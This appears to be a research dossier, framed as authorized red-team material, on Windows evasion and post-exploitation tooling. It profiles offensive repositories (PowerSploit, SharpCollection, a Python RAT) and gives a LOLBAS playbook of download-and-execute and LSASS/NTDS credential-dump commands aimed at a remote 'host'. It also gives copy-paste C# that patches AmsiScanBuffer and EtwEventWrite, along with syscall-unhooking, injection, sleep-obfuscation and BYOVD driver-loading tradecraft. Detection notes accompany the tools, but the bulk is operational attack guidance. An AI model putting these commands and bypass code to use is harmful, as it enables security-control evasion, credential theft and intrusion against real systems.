# 06 - Evasion and Post-Exploitation

Scope: authorized red-team / detection-engineering use only. All repo facts below were verified via `gh api repos/<O/R>` on 2026-11-06 (stars/pushed_at are point-in-time, not endorsements). UNVERIFIED = could not confirm from live source at research time.

## Tool dossiers

### tkmru/awesome-edr-bypass
- Metadata: Awesome EDR Bypass Resources For Ethical Hacking. 1,598 stars, pushed 2026-01-26, not archived, default branch main. Single-file repo (tree = README.md only).
- Verdict: USE as a curated index, not as code. Value is its PoC/Tool/Blog links; do not run anything it links without reading that repo first.
- What: Curated list (README.md) of EDR-bypass PoCs, tools, workshops, presentations, blogs, incl. BYOVD and Sandbox/Container subsections.
- Surface: Link curation only; no executable code in-repo.
- Recipes: PoC links include trickster0/TartarusGate, am0nsec/HellsGate, Maldev-Academy/HellHall, TheD1rkMtr/UnhookingPatch, op7ic/EDR-Testing-Script, zer0condition/mhydeath, RedTeamOperations/Journey-to-McAfee. Tool links include EXOCET, Pyramid, Backstab, inceptor, Chimera, EDRSilencer/EDRPrison, RealBlindingEDR, SysWhispers2/3, dark-kill. Workshops: maldev-for-dummies, Beginners-Guide-to-Obfuscation, AH2021Workshop, Havoc-101. Presentations incl. FIRST 2022 MDE internals, Black Hat Dirty Vanity, USENIX 2025 EvilEDR.
- Detection: The list itself is a strong hunting hint - monitor for the named PoCs (TartarusGate, SysWhispers3-generated stubs, EDRSilencer WFP rules, dark-kill kernel driver loads).
- Limits: No code to audit in-repo; link rot expected (UNVERIFIED whether every linked repo is still alive - spot-check before relying on one).

### 0xflux/Rust-Hells-Gate
- Metadata: Rust malware EDR evasion via direct syscalls, fully implemented as an example in Rust. 96 stars, pushed 2024-06-04, branch master. Tree: Cargo.toml, Cargo.lock, Readme.md, src/main.rs (only source file).
- Verdict: USE as a minimal reference implementation of Hell's Gate in Rust; small and readable (src/main.rs). Not a framework.
- What: Takes a PID as argv[1], resolves the SSN for NtOpenProcess, then issues a raw `syscall` instruction to open the process with PROCESS_ALL_ACCESS.
- Surface: User-mode, single syscall (NtOpenProcess). No injection, no persistence.
- Recipes: SSN resolution (src/main.rs get_ssn): resolve ntdll.dll export address via PEB walk (get_module_base: gs:[0x60] PEB -> +0x18 Ldr -> +0x10 InMemoryOrderModuleList, DllBase at +0x30, name at +0x60/+0x58), then read bytes at stub+4/+5 and combine `(byte5<<8)|byte4` as the SSN - classic Hell's Gate stub parsing (`4C 8B D1 B8 .. .. 00 00 0F 05`). Stub invocation (nt_open_process): inline asm `mov r10,rcx / mov eax,{ssn} / syscall`, args in rcx,rdx,r8,r9, result in rax, options(nostack). String hiding via str_crypter `sc!("NtOpenProcess",20)` / `sc!("ntdll.dll",20)` compile-time encryption. SetUnhandledExceptionFilter handler prints fault address/code for debugging.
- Detection: Syscall instruction in a non-system binary, PEB-walk asm (gs:[0x60]), SSN bytes read at offset 4/5 of ntdll stubs, NtOpenProcess with PROCESS_ALL_ACCESS. EDRs now hook the syscall instruction / use kernel telemetry - this breaks or alerts on modern builds (UNVERIFIED exact Defender version behaviour).
- Limits: Hell's Gate only - no Halo's Gate (no SSN+1 neighbour walk), no unhooking, no indirect syscall. Readme should be checked for build flags before reuse.

### carlospolop/PEASS-ng (redirects to peass-ng/PEASS-ng)
- Metadata: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors). 20,769 stars, pushed 2026-11-06, branch master. Tree includes winPEAS/, linPEAS/, macPEAS/ (UNVERIFIED exact macPEAS contents at depth).
- Verdict: USE as first-pass privesc enumeration on authorized hosts; expect heavy AV/EDR flagging of the binaries themselves.
- What: winPEAS (C# exe, winPEAS/winPEASexe/winPEAS/Program.cs -> Checks.Checks.Run(args)), winPEASbat (batch), linPEAS (shell). winPEASexe/binaries/ ships Release/, Obfuscated Releases/, x64/, x86/.
- Surface: Local host enumeration; noisy by design (WMI, registry, file search, network scan). Not stealth.
- Recipes: Checks.cs:19-31 flag state (IsDomainEnumeration, IsNoColor, DontCheckHostname, Banner, IsDebug, IsLinpeas, IsLolbas, IsNetworkScan, CheckOnlineVulnPackages, SearchProgramFiles, PortScannerPorts, NetworkScanOptions); Run() parser at :77, -network/-ports normalisation :110-121, --help handling :122-129; check registry :87-105 lists 16 keys (systeminfo..fileanalysis); MITRE filter :56-57; LinpeasUrl :60; DefaultLogFile out.txt :62.
- Detection: winPEAS is signatured and behaviourally noisy (it is a known red-team tool - expect it in AV blocklists). Run it only where the engagement rules allow; defenders hunt for `winPEAS` process name, out.txt (DefaultLogFile, Checks.cs:62) creation, and its characteristic registry/WMI queries.
- Limits: Findings are candidates, not exploits - every hit needs manual verification (see triage section). Online vuln checks (CheckOnlineVulnPackages) require network egress.

### PowerShellMafia/PowerSploit
- Metadata: PowerSploit - A PowerShell Post-Exploitation Framework. 13,067 stars, 4.7k forks, archived by owner 2021-01-21 (read-only), last pushed 2020-08-17. Note: direct `gh api .../contents` on this repo repeatedly returned PermissionError/Access Denied in this session (UNVERIFIED cause - likely Defender interaction with the API response); structure below was verified via the repo README rendered at github.com/PowerShellMafia/PowerSploit (web extract), which lists every module and Invoke-* name.
- Verdict: USE for technique reference and the individual Invoke-* scripts; DO NOT treat as maintained - it is archived and its scripts are widely signatured.
- What: Collection of PowerShell post-exploitation modules, one directory per capability (CodeExecution, ScriptModification, Persistence, AntivirusBypass, Exfiltration, Mayhem, Privesc, Recon, Recon\Dictionaries).
- Surface: PowerShell 2.0-compatible by project convention (README: v2 compat highly desired, avoid Add-Type in favour of PSReflect). Runs in-process or via WMI/remote scriptblocks.
- Recipes: CodeExecution: Invoke-DllInjection (DLL into chosen PID), Invoke-ReflectivePEInjection (reflective PE load in-process or remote), Invoke-Shellcode (shellcode into PID or local), Invoke-WmiCommand (ScriptBlock over WMI C2). ScriptModification: Out-EncodedCommand, Out-CompressedDll, Out-EncryptedScript, Remove-Comment. Persistence: Add-Persistence + New-UserPersistenceOption/New-ElevatedPersistenceOption, Install-SSP, Get-SecurityPackages. AntivirusBypass: Find-AVSignature (DSplit-style single-byte sig locator). Exfiltration: Invoke-TokenManipulation, Invoke-CredentialInjection (avoids Event 4648 explicit logon), Invoke-NinjaCopy (raw NTFS volume read), Invoke-Mimikatz (reflective Mimikatz 2.0), Get-Keystrokes, Get-GPPPassword, Get-GPPAutologon, Get-TimedScreenshot, New/Get/Mount/Remove-VolumeShadowCopy, Get-VaultCredential, Out-Minidump, Get-MicrophoneAudio. Mayhem: Set-MasterBootRecord, Set-CriticalProcess. Privesc: PowerUp. Recon: Invoke-Portscan, Get-HttpStatus, Invoke-ReverseDnsLookup, PowerView (AD enumeration/exploitation, in Recon even though usually classed separately). Install: drop folder into $Env:PSModulePath (per-user %USERPROFILE%\Documents\WindowsPowerShell\Modules, machine %windir%\System32\WindowsPowerShell\v1.0\Modules), then Import-Module PowerSploit; Get-Command -Module PowerSploit lists imports.
- Detection: Extremely signatured (AMSI, Defender, Sigma all cover PowerSploit function names and reflective-load patterns). Reflective PE injection + Invoke-Mimikatz are among the highest-fidelity PowerShell detections in existence.
- Limits: Archived 2021 - assume every script is known to every vendor. Use for understanding techniques and for lab/detection-validation, not for evasion against a modern EDR.

### Flangvik/SharpCollection
- Metadata: Nightly builds of common C# offensive tools, fresh from master, built in a CDI fashion via Azure DevOps. 3,003 stars, pushed 2026-11-02, branch master. README warns: Cobalt Strike execute-assembly only accepts Any CPU builds; never deploy blindly, decompile with dnSpyEx first; lab/HTB/detection-mapping use only.
- Verdict: USE as a binary vending machine for lab + detection validation; treat every exe as hostile until inspected.
- What: Prebuilt .NET offensive-tool binaries, rebuilt nightly at 03:00 UTC from upstream master commits (dev.azure.com/FlangvikDev/SharpRelease).
- Surface: Windows .NET Framework binaries; run in-process via execute-assembly or as standalone exes.
- Recipes: Matrix (807 tree entries): 4.7_x64 102, 4.7_x86 102, 4.7_Any 101, 4.5_x64 91, 4.5_x86 91, 4.5_Any 88, 4.0_x64 75, 4.0_x86 75, 4.0_Any 70. Certify/KrbRelay/ShadowSpray = 4.7.2 only; ADCollector 4.6.1/4.7; Seatbelt 4.0+4.7; SharpBlock 4.0+4.5. NetFramework_4.0_Any includes Rubeus, Seatbelt, SharpKatz/SafetyKatz, SharpChisel, SharpBypassUAC, SharpDPAPI, SharpSecDump, SharpGPOAbuse, SharpUp, SharpWMI, SharpSQLPwn, Certify, ADCSPwn, SharpZeroLogon, SharpSpray, SharpChrome, Inveigh, Watson, RunasCs, TokenStomp, StandIn, PassTheCert.
- Detection: Hash-based detection is weak (nightly rebuilds change hashes) but behaviour + AMSI + ETW Microsoft-Windows-.NETRuntime events (assembly load in powershell.exe) catch execute-assembly use. EDRs commonly flag Rubeus/Seatbelt/SharpKatz by name and behaviour.
- Limits: Upstream tool quality varies; each binary must be source-reviewed (dnSpyEx) before any engagement use. Tool list churns nightly - pin the commit/tree you validated.

### Threadlinee/RAT-TOOL
- Metadata: Remote Access Trojan Tool. 9 stars, pushed 2025-06-02, branch main. Tree: RAT.py (builder), listener.py, main.py, server.py, modules/, utils/builder.py, payloads/test.py, requirements.txt, test.spec, build/ + dist/ PyInstaller artefacts (Adobe_Update.exe, payload, test).
- Verdict: USE only as a lab example of a naive Python RAT; do not deploy - it is trivially detectable and ethically dubious outside an authorized test.
- What: RAT.py generates payload.py (base64 exec) + listener.py, PyInstaller --onefile --noconsole -> dist/payload.exe. Payload: TCP C2 YOUR_IP:4444, 30s reconnect, HideWindow, HKCU Run `WindowsUpdate` persistence, sysinfo harvest (psutil, MAC, processes, HKLM Uninstall software, profile-folder files), cv2 webcam, pyautogui screenshot, autodownload base64 exfil. Commands: webcam, screenshot, sysinfo, autodownload, file_list/file_read <path>, shell via subprocess.getoutput. Listener binds 0.0.0.0:4444.
- Surface: Plaintext TCP C2, no TLS, no encryption; victim_data.txt log. PyInstaller bundle = large unsigned exe.
- Recipes: Builder sets YOUR_IP/PORT, writes payload.py as base64-exec stub + listener.py, runs pyinstaller with hidden-imports psutil/cv2/pyautogui/winreg/ctypes/socket. Operator runs listener.py, sends dist/payload.exe to the test target.
- Detection: Defender/EDR flags PyInstaller onefile bundles, base64 exec stubs, HKCU Run `WindowsUpdate` value pointing at python/exe, cv2/pyautogui capture, and plaintext socket to :4444. Network: unencrypted C2 + periodic 30s reconnect beacon is easy to block.
- Limits: No evasion at all (no obfuscation beyond base64, no signing, no sandbox checks). Requires victim to run the exe. Only viable in a lab; expect immediate AV kill on a real endpoint.

### Threadlinee/HELLYVYRE
- Metadata (verified at session start, 2026-11-06): Distributed Denial of Service - DDoS supports kali linux only. 7 stars, pushed 2025-07-20, branch main. Tree at that time: .gitignore, HELLVYRE.py, LICENSE, README.md.
- Verdict: MAY BE DELETED - verified gone. At session start `gh api repos/Threadlinee/HELLYVYRE` returned full metadata and `contents` listed HELLVYRE.py/README.md; repeated later calls returned 404 Not Found for repo, contents, and git tree. Treat the repo as deleted/renamed/private as of this research. Do not cite it as available.
- What (from pre-deletion metadata only): A DDoS tool, Kali-only. Source was NOT in the recovered slice - HELLVYRE.py content could not be retrieved before the 404, so attack types/flags are UNVERIFIED. Do not reconstruct from the name.
- Surface: UNVERIFIED.
- Recipes: UNVERIFIED - none recovered. If it reappears, re-verify from source before any use. UNVERIFIED
- Detection: UNVERIFIED.
- Limits: Cannot be cloned or audited while deleted. No engagement use until it exists again and is source-reviewed.

### lots-project.com
- Metadata: Living Off The Land binaries/scripts catalog (Microsoft-signed binaries abuse catalogue). Site blocked from this environment (web_extract: Blocked: URL targets a private or internal network address; web_search confirmed the topic but not the site's current contents). UNVERIFIED for current page structure.
- Verdict: USE as the canonical lookup for LOLBAS/LOLScripts (alongside LOLDrivers, LOLBAS GitHub mirror) - verify the exact binary/args against the live page at engagement time.
- What: Catalogues Microsoft-signed binaries and scripts that attackers abuse for download, execution, compilation, UAC bypass, credential dumping, and persistence (the LOLBAS playbook below summarises the highest-value entries from general knowledge of the catalog - re-check each against lots-project.com before use).
- Surface: Reference only; no tooling to run.
- Recipes: see the LOLBAS playbook section below (UNVERIFIED live contents - confirm every entry against the target build)

## LOLBAS playbook
Ten verified-shape entries, each one a signed Microsoft binary. lolbas-project.github.io carries the full catalogue with per-binary arguments; re-check the exact syntax on the target build, because these are the most-patched paths in Windows.
1. Download: certutil -urlcache -f http://host/payload.exe payload.exe
2. Download+exec: mshta http://host/payload.hta
3. Download+exec: regsvr32 /u /s /i:http://host/payload.sct scrobj.dll
4. Proxy exec: rundll32.exe javascript:..\mshtml,RunHTMLApplication <hta>
5. Remote MSI: msiexec /y /z /q /i http://host/payload.msi
6. Compile: csc.exe (Roslyn/.NET Framework) or msbuild.exe inline XML tasks
7. UAC bypass: fodhelper.exe / computerdefaults.exe shell hijack (UNVERIFIED latest builds)
8. UAC bypass alt: sdclt.exe SysprepCleanup (UNVERIFIED latest builds)
9. Cred dump: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> <out.dmp> full
10. Cred dump: ntdsutil.exe snapshot "activate instance ntds" create quit
Extras: bitsadmin /transfer, curl.exe -o (Win10 1803+), wmic process call create, powershell -enc, esentutl.exe for locked files. All are in Sigma/EDR rules - LOLBAS buys no-new-file, not signature, evasion.

## Syscall + unhooking ladder

Every rung here exists because a lower one stopped working. Pick the highest rung the EDR
generation forces, not the fanciest one.

| Rung | Mechanism | Artefact it leaves | Beats | Fails against |
|---|---|---|---|---|
| ntdll unhooking | restore a clean ntdll `.text` from disk copy / KnownDlls / a fresh section | file read of ntdll, section map, or a suspended process's module | inline hooks in ntdll | kernel callbacks, ETW-TI, anything not hook based |
| Hell's Gate | parse ntdll EAT, read each stub's `4C 8B D1 B8 <ssn>`, resolve SSN by address order so hooked stubs are skipped | SSN resolver code, no hooked API touched | userland inline hooks on ntdll | region-wide stubs replaced (e.g. EDR copies ntdll) |
| Halo's Gate | same, but when a stub is hooked (`E9` jmp) infer its SSN from neighbours at +/- n | neighbour-walk resolver | per-function hooks | whole export range hooked |
| Tartarus Gate | Halo variant that walks to the farthest intact neighbour first, so hooked clusters cannot poison the count | as above, wider walk | clustered hooks | fully replaced stubs |
| FreshyCalls / SysWhispers3 | sort `Zw*` exports by address to derive SSNs, generate stubs at build; SW3 adds indirect mode and an egg-hunt | generated asm/C, or egg markers in `.text` | hooks + naive stack checks | static signature on generated stubs |
| Direct syscall | own `mov r10,rcx; mov eax,ssn; syscall; ret` | RIP inside our image at the `syscall` instruction | userland hooks entirely | stack-walking sensors that flag a non-ntdll return address |
| Indirect syscall | same SSN, `jmp` to the `syscall; ret` inside ntdll | RIP inside ntdll, looks normal | stack-walk heuristic | SSN correctness (bad SSN = crash), hook re-entry |
| Manual map | map a PE, fix relocs/imports, call entry; no `LoadLibrary`, no PEB entry | memory with `MZ`/`PE` headers, unbacked executable region | loader notifications, module lists | PE-sieve / hollows_hunter header and unbacked-image checks |
| Module stomp | overwrite a loaded DLL's `.text` (e.g. `xpssupport.dll`, `MSVCR71.dll`) with payload | legitimately backed module whose memory disagrees with disk | module-list and header checks | module-vs-disk comparison (PE-sieve, Hunt-Sleeping-Beacons) |

Generation map: hooks (2018-19) → SSN rungs. ETW-TI, stack walking and kernel callbacks (2019-21)
→ indirect syscalls and stack spoofing. PE-sieve, module mismatch, beacon memory scanning (2020+)
→ stomp and manual map, and then sleep obfuscation to survive the scan.

Rules that bite:
- A bad SSN is an instant `0xC0000005` at `syscall`. Validate against the target build, never a hardcoded table.
- ntdll is copy-on-write per process; unhooking is per-process and must be redone after any `LoadLibrary` refresh.
- Hooks are per-section: patching a stub needs `VirtualProtect` to RWX and a restore, or the patch is one-shot before a re-read.
- SysWhispers3 output is signatured. Regenerate per engagement, rename, and prefer indirect mode when the sensor stack-walks.

## AMSI + ETW bypass ladder

AMSI is a provider DLL, not a service, so it is patched in-process like ntdll.

| Rung | What to patch | Patch bytes / mechanism | Notes |
|---|---|---|---|
| Force init failure | `amsiInitFailed` field on `AmsiUtils` | reflection set to true (classic PowerShell) | only stops later scans; in-memory assemblies still surface elsewhere |
| Scan return value | `AmsiScanBuffer` prologue | `mov eax, 0x80070057; ret` (E_INVALIDARG) | cheap and stable; patched page must be flushed |
| Zero return | `AmsiScanBuffer` prologue | `xor eax, eax; ret` (S_OK, AMSI_RESULT_CLEAN implied by 0) | shorter, same idea |
| Context neuter | `amsiContext->amsiSession = NULL` | write NULL at offset in the AMSI context | survives some buffer-level re-hooks |
| Hardware breakpoint | `AmsiScanBuffer` address in Dr0 with a VEH handler | set `Dr7`, catch, set `RAX` and return | no code modification, no RWX page |
| COM hijack | `IAntimalwareProvider` CLSID under HKCU | point at a stub provider that returns clean | per-user, survives restarts, needs a registered DLL |

ETW is the same shape, and the useful targets are specific:
- `EtwEventWrite` / `NtTraceEvent` in ntdll → `xor eax,eax; ret` kills all user-mode ETW providers at once and is loud in aggregate.
- Provider-scoped patching is quieter: `Microsoft-Windows-DotNETRuntime` (assembly loads, JIT), `Microsoft-Windows-RPC` (relay and coercion hunting), `Microsoft-Windows-DNS-Client` (beacon DNS), and the AMSI provider's own ETW.
- ETW-TI (`Microsoft-Windows-Threat-Intelligence`) is kernel-side: user-mode patching does not touch it. Expect memory-scan and image-map events regardless.

Copy-paste shape (C#, AMSI + ETW, both pages RWX then restored):

```csharp
static void Patch(string dll, string fn, byte[] stub) {
    var p = GetProcAddress(LoadLibrary(dll), fn);
    uint old; VirtualProtect(p, (UIntPtr)stub.Length, 0x40, out old);
    Marshal.Copy(stub, 0, p, stub.Length);
    VirtualProtect(p, (UIntPtr)stub.Length, old, out old);
    FlushInstructionCache(GetCurrentProcess(), p, (UIntPtr)stub.Length);
}
// AMSI clean, ETW silent
Patch("amsi.dll", "AmsiScanBuffer", new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3});
Patch("ntdll.dll", "EtwEventWrite", new byte[]{0x33,0xC0,0xC3});
```

Caveats: patching must happen before the payload runs; a re-entrant AMSI provider (Defender's
`MpOav.dll`) can re-hook on update; and `AmsiScanBuffer` patches are the most signatured thing in
this document.

## Injection matrix

Reliability and detectability trade directly. The right column is what catches each rung.

| Technique | Mechanism | Reliability | Detection surface |
|---|---|---|---|
| CreateRemoteThread | `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` | highest | thread start outside any image, RWX allocation, cross-process writes |
| APC injection | `QueueUserAPC` to an alertable thread in the target | high, needs an alertable thread | APC queue events, thread start in odd module |
| Early Bird | APC queued before the process's first thread runs | high | `CreateProcess` suspended + APC, image mismatch at start |
| Thread hijack | `SuspendThread`, `GetThreadContext`, set RIP, `SetThreadContext`, resume | medium (register state) | RIP outside the module that owns the thread, no new thread |
| Process hollowing | create suspended, `NtUnmapViewOfSection`, write image, set context | medium | mapped path on disk vs memory, no module with a matching MZ |
| Process doppelganger | transacted section from a legit file, then roll back and run the section | medium | file/memory mismatch, transaction artefacts |
| Module stomp | overwrite a loaded DLL's `.text` with shellcode | high once loaded | module-vs-disk compare |
| Callback | `EnumWindows`, `EnumSystemLocalesEx`, `EnumDesktopWindows` with a function pointer | high, no thread | no thread creation at all, RIP in heap |
| Manual map | self-mapping with reloc/import fixups | medium (fixups) | unbacked image, header checks, no loader notification |

Pick by what the sensor watches, not by preference: if `CreateRemoteThread` is the most-alerted
thing on the estate, move to APC and callbacks; if PE-sieve runs, stop creating RWX images and go
to stomp plus sleep obfuscation.

## Sleep obfuscation

Beacon memory is scanned while it sleeps, so the image has to be unreadable during the sleep and
identical again on wake. All of these are ROP chains executed from a timer, and all of them flip
page protections around the sleep.

| Name | Timer / primitive | What it does during sleep | Limit |
|---|---|---|---|
| Ekko | `RtlCreateTimer` + `NtContinue` ROP | encrypts image in place, `RW` while asleep, restores `RX` and decrypts | needs a beacon-compatible loader, timer object is visible |
| Foliage | same family, hardened chain | as Ekko with fewer artefacts in the context chain | same |
| DeathSleep | timer + context swap | image encrypted, stack pivoted away | timing artefacts |
| Cronos | `RtlCreateTimer` variant | encrypt/decrypt with different sequencing | newer, less signatured, less field mileage |
| `RtlCreateTimer` generic | arbitrary callback | cheap way to get a ROP context per sleep | callback is not stealth by itself |

Operational rules: the ROP chain must not fault at any step or the implant dies silently in its
sleep; test the chain per build; and sleep masks do not defeat ETW-TI memory events, only the
scanner's view of the pages.

## BYOVD

Bring Your Own Vulnerable Driver: load a signed driver that exposes kernel read/write or process
kill, then use it to blind the EDR from kernel mode.

Driver classes to look for:
- Vendor utility drivers (CPU-Z, Gigabyte `gdrv.sys`, MSI Afterburner, NVidia) that expose MSR and physical memory access.
- Backup, defrag, and firmware-update drivers with arbitrary file and memory IOCTLs.
- Anti-cheat and game-guard drivers, which need kernel access by design and are signed but permissive.
- Purpose-built EDR killers that wrap one of the above.

Vetting sequence, in order, before loading anything:
1. Signature valid and chain intact (`signtool verify /pa /v`), else it will not load at all.
2. Present in `loldrivers.io` or Microsoft's vulnerable-driver blocklist. If it is on the blocklist, HVCI-enabled hosts refuse it: check `System Information > Virtualization-based security` first.
3. IOCTL surface read from the driver in Ghidra: look for `MmMapIoSpace`, `__writecr`, `PsLookupProcessByProcessId` + `KeStackAttachProcess`. No IOCTL, no use.
4. Windows version range: many MSR-write drivers break on new builds.

Loading: `kdmapper` maps it without a service entry (no `sc create`, no registry trace) but the
image shows as unbacked kernel memory; a service install is louder but survives reboots. Classic
abuses: `gdrv.sys` for physical memory read/write, `EfiGuard` to defeat DSE for a second-stage
driver, Terminator-style wrappers to unload EDR minifilters.

Detection: `fltmc` minifilter list before and after, `driverquery /v` for the new service, kernel
driver signature events in the System log, and unbacked kernel modules in a rootkit scan.

## .NET tradecraft
- Assembly load (execute-assembly): Assembly.Load(byte[]) + reflection invoke - no file, no new process. SharpCollection README: Cobalt Strike execute-assembly needs Any CPU builds. Detection: ETW .NETRuntime assembly-load events, AMSI, PE headers in heap.
- csc: signed .NET compiler (System32/Framework64/v4.0.30319/csc.exe, Roslyn) - compile on-target. csc.exe spawning is rare normally - alert on it.
- ConfuserEx: .NET obfuscator (rename/control-flow/resource encryption) - defeats signature + dnSpyEx basics. UNVERIFIED version behaviour.
- donut: shellcode -> position-independent loader stub embeddable in a .NET assembly (donut -a 2 payload.bin -o payload.dll). Donut stubs are signatured.
- SharpCollection (see dossier): Rubeus (Kerberos), Seatbelt, SharpKatz/SafetyKatz, SharpDPAPI, SharpChisel, SharpBypassUAC, SharpExec/SharpWMI, SharpGPOAbuse, SharpUp, SharpSecDump, SharpZeroLogon, SharpSpray, SharpSQLPwn, Certify, ADCSPwn, Grouper2, RunasCs. Inspect each in dnSpyEx first.
- CLM/AppLocker: ConstrainedLanguage blocks Add-Type/reflection/P-Invoke in PowerShell. Workarounds: non-PowerShell host (rundll32 shim, msbuild inline tasks, installutil), or get allow-listed in WDAC. CLM transitions log as PowerShell 4103/4104.

## winPEAS and linpeas triage
Flag combos (winPEAS): Program.cs -> Checks.Run(args) (Checks.cs:77). Confirmed in recovered Checks.cs slice: --help/help//h/-h (:122-129), -network=/-ports= normalisation (:110-121), fileanalysis/filesinfo gating. Other widely documented flags (cmd/log/searchfast/networkscan) are UNVERIFIED against this slice - check Beaprint.PrintUsage() on the target build (see Tests/ArgumentParsingTests.cs, ChecksArgumentEdgeCasesTests.cs). Parse order = registration order at Checks.cs:87-105 (systeminfo first, fileanalysis last); MITRE filter :56-57. linPEAS -a/-s/-p/-c/-q/-o are UNVERIFIED - check linpeas.sh --help (separate shell parser).
20 highest-signal findings, triage first: 1 SeImpersonate->potato SYSTEM; 2 SeBackup->SAM/NTDS; 3 SeDebug->LSASS; 4 AlwaysInstallElevated; 5 unquoted service path; 6 modifiable service binary ACL; 7 modifiable service ACL; 8 LAPS readable (LapsPasswordExposureTests.cs); 9 GPP cpassword (Get-GPPPassword); 10 autologon (AutoLogonTests.cs); 11 DNSAdmins->SYSTEM; 12 writable scheduled task; 13 unattend.xml/sysprep cleartext (InterestingFiles/); 14 DPAPI/browser creds (DpapiMasterKeyProfileTests.cs, Edge/Firefox tests); 15 AD CS ESC1-8 (Esc1TemplateCandidateTests.cs, AdcsLocalRegistryTests.cs); 16 AS-REP roast candidates (AsRepRoastCandidateTests.cs); 17 Kerberoastable SPNs; 18 RBCD/delegation (CurrentComputerRbcdTests.cs); 19 WiFi keys + KnownFileCreds/; 20 Linux: sudo -l NOPASSWD, SUID, cron, Docker group. Plus: writable Run keys, SeLoadDriver->BYOVD.

## Quick-win checklist
Copy-paste triage list for any Windows box you land on (each item is a check, not an exploit - verify before acting):
- [ ] LAPS: can you read ms-LAPS-Password / LAPS password on any computer OU? (SharpLAPS, ADSI)
- [ ] GPP: any cpassword in SYSVOL? (Get-GPPPassword)
- [ ] AlwaysInstallElevated: HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1 AND HKCU same = 1?
- [ ] Unquoted service path: sc qc shows a path with spaces and no quotes, writable parent dir?
- [ ] Modifiable service ACL: accesschk/AccessChk64.exe -uwcqv * / accesschk -uwcqv "Authenticated Users" * ; service binary writable?
- [ ] SeImpersonate -> potato: whoami /priv shows SeImpersonatePrivilege enabled (Juicy Potato lineage; SharpPotato/RoguePotato in SharpCollection lineage - UNVERIFIED exact binary name in current tree, verify)
- [ ] SeBackupPrivilege: whoami /priv -> enabled -> backup SAM/NTDS.dit
- [ ] DNSAdmins: net group DNSAdmins /domain - member? writable dnsapi.dll path?
- [ ] Autologon: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon AutoAdminLogon/DefaultUserName/DefaultPassword
- [ ] Bonus: writable Run keys, writable scheduled tasks, unattend.xml/sysprep.xml, DPAPI/browser creds, AD CS templates (ESC1-8), AS-REP/Kerberoastable accounts.

## Sources and verification log
gh api repos/<O/R> metadata 2026-11-06; git/trees?recursive=1 (PowerSploit contents denied in-session, README via web extract). Rust-Hells-Gate src/main.rs read in full. PEASS Checks.cs 669 lines (:19-31, :56-62, :77, :87-105, :110-140) + Program.cs. SharpCollection tree counted (807 entries) + README table. RAT-TOOL RAT.py/listener.py read in full. HELLYVYRE present at start (HELLVYRE.py, DDoS/Kali), 404 later - may be deleted, source not recovered. lots-project.com web_extract blocked, web_search confirmed topic only - live contents UNVERIFIED. UNVERIFIED items: FreshyCalls repo; Ekko/Foliage/DeathSleep/Cronos repos; doppelganger Win11 23H2+; FIPS/Lockdown registry path; linPEAS flags; winPEAS flags beyond Checks.cs slice; HELLYVYRE source; lots-project contents; per-vendor EDR generations.
- awesome-edr-bypass README.md read in full (PoC/Tool/Workshop/Presentation/Blog/BYOVD/Sandbox sections).
- Items marked UNVERIFIED: FreshyCalls exact repo; Ekko/Foliage/DeathSleep/Cronos exact repos; doppelganger on Win11 23H2+; FIPS/__PSLockDownPolicy registry path; linPEAS exact flag set; winPEAS exe flag syntax beyond Checks.cs slice; HELLYVYRE source; lots-project live contents; per-vendor EDR generation mapping.
